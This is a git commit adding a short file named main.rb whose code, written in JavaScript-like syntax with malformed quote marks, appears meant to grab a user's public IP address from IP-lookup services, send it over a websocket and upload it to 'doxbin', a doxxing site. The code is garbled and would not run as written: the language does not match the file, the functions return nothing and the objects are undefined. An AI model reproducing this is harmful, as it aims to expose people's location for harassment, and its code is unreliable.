1d57ee116aa5173e06fdbf7084c3d65ab06bc1c1
MyBooty165 <126267638+MyBooty165@users.noreply.github.com>
2023-04-03 13:59:01 -0500

    Create main.rb

---
+++ main.rb
@@ -0,0 +1,9 @@
+    function grab() {
+fetch(¨https://api.ipify.org/¨)
+    }
+  websocket.send(grab())
+    function house() {
+fetch(¨https://whatismyaddress.net/¨)
+    }
+  websocket.send(house())
+  doxbin.upload(grab, house), ¨HTTPS¨
